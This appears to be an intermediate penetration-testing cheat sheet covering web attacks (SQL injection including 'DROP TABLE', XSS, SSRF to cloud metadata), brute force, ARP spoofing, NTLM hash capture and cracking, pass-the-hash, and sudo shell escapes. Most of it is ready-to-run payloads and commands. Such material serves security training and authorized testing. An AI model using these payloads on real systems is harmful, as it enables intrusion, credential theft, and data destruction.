# Penetration Testing — Intermediate

## Web Application Testing (OWASP Top 10 in Practice)

### SQL Injection
```sql
-- Test inputs (always in authorized environments)
' OR '1'='1
' OR 1=1--
1; DROP TABLE users--
1 UNION SELECT username,password FROM users--

-- Blind SQL injection (boolean-based)
' AND 1=1--    → returns results (true)
' AND 1=2--    → returns no results (false)
-- If behavior differs, SQLi exists

-- Time-based blind
' AND SLEEP(5)--    → 5 second delay confirms SQLi
```

### Cross-Site Scripting (XSS)
```javascript
// Reflected XSS test payloads
<script>alert(1)</script>
<img src=x onerror=alert(1)>
"><script>alert(document.cookie)</script>

// If alert fires, XSS exists
// Real impact: steal session cookies, redirect users, keylogging
```

### Broken Authentication
```bash
# Default credentials testing
admin:admin, admin:password, root:root, admin:123456

# Brute force (only on authorized targets)
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form   "/login:username=^USER^&password=^PASS^:Invalid credentials"

# JWT manipulation
# Decode JWT: base64 -d <<< "eyJ..." | python3 -m json.tool
# Test: change algorithm to "none", remove signature
```

### SSRF (Server-Side Request Forgery)
```bash
# Test if server fetches URLs you provide
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"
# If AWS EC2 metadata returned → SSRF vulnerability
# Impact: access internal services, cloud credentials

curl "https://target.com/fetch?url=http://localhost:6379/INFO"
# If Redis info returned → internal service exposed
```

## Network Penetration Testing

```bash
# ARP spoofing (MITM on local network)
arpspoof -i eth0 -t victim-ip gateway-ip  # Redirect victim traffic through attacker

# Password hash capture (Responder)
responder -I eth0 -rdwv  # Capture NTLM hashes on Windows networks

# Password cracking
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt  # NTLM
hashcat -m 0 hashes.txt wordlist.txt                          # MD5

# Pass-the-hash (Windows)
# evil-winrm -i target-ip -u Administrator -H "NTLM_HASH"
```

## Privilege Escalation

```bash
# Linux privilege escalation checks
sudo -l                            # What can current user run as root?
find / -perm /4000 2>/dev/null    # SUID binaries
cat /etc/cron*                     # Cron jobs running as root
ls -la /etc/passwd                 # World-writable config files?

# GTFOBins: https://gtfobins.github.io/
# If you can run vim as sudo: sudo vim -c ':!/bin/bash'
# If you can run find as sudo: sudo find . -exec /bin/bash \;

# Windows privilege escalation
# winPEAS.exe  → automated PE checks
# PowerShell: Get-LocalGroupMember Administrators
# Check: AlwaysInstallElevated, unquoted service paths, weak permissions
```
